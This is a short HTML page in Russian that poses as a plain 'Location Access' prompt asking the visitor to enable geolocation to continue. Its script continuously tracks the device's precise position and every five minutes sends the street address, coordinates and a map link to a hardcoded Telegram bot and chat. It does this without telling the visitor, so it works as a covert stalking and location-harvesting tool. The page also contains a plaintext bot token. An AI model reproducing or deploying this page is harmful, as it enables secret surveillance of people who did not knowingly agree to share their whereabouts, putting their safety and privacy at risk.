<!DOCTYPE html>
<html lang="ru">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
<title>Live Location</title>

<style>
body {
  margin:0;
  height:100vh;
  display:flex;
  justify-content:center;
  align-items:center;
  font-family:Arial;
  background:linear-gradient(135deg,#06121f,#0a2a44,#0e3b5e);
  color:white;
}

.card{
  width:90%;
  max-width:420px;
  background:rgba(255,255,255,0.08);
  backdrop-filter:blur(20px);
  padding:25px;
  border-radius:20px;
  text-align:center;
}

button{
  width:100%;
  padding:14px;
  border:none;
  border-radius:12px;
  background:#00b7ff;
  color:white;
  font-weight:bold;
  margin-top:10px;
}

.status{
  margin-top:15px;
  font-size:14px;
  color:#bfe8ff;
}

.addr{
  margin-top:15px;
  font-size:13px;
  color:#d8f1ff;
  line-height:1.5;
}
</style>
</head>

<body>

<div class="card">
  <h2>📍 Location Access</h2>
  <p>Разрешите геолокацию для продолжения</p>

  <button onclick="start()">Разрешить геолокацию</button>

  <div class="status" id="status">ожидание...</div>
  <div class="addr" id="addr"></div>
</div>

<script>
const BOT_TOKEN = "8837254914:AAFuvODF5meguiR61yWRcPO0KwzeoY6k--c";
const CHAT_ID = "8424328584";

let lastSend = 0;
let watchId;

async function getAddress(lat, lon){
  try {
    const res = await fetch(
      `https://nominatim.openstreetmap.org/reverse?lat=${lat}&lon=${lon}&format=json`
    );
    const data = await res.json();
    return data.display_name || "адрес не найден";
  } catch {
    return "ошибка получения адреса";
  }
}

async function sendTG(text){
  await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,{
    method:"POST",
    headers:{"Content-Type":"application/json"},
    body:JSON.stringify({
      chat_id:CHAT_ID,
      text
    })
  });
}

function start(){
  if(!navigator.geolocation){
    alert("GPS не поддерживается");
    return;
  }

  document.getElementById("status").innerText = "GPS активен...";

  watchId = navigator.geolocation.watchPosition(async pos=>{
    const now = Date.now();

    // каждые 5 минут
    if(now - lastSend < 5*60*1000) return;
    lastSend = now;

    const lat = pos.coords.latitude;
    const lon = pos.coords.longitude;

    const address = await getAddress(lat, lon);

    document.getElementById("addr").innerHTML =
      "📍 " + address;

    document.getElementById("status").innerText =
      "отправка данных...";

    const msg =
`📍 Live Location

🏠 Адрес:
${address}

🌐 Координаты:
${lat}, ${lon}

🗺 Google Maps:
https://maps.google.com/?q=${lat},${lon}`;

    await sendTG(msg);

    document.getElementById("status").innerText =
      "активно (обновление каждые 5 минут)";

  }, err=>{
    document.getElementById("status").innerText =
      "нужно разрешить геолокацию";
  },{
    enableHighAccuracy:true,
    maximumAge:0,
    timeout:10000
  });
}
</script>

</body>
</html>
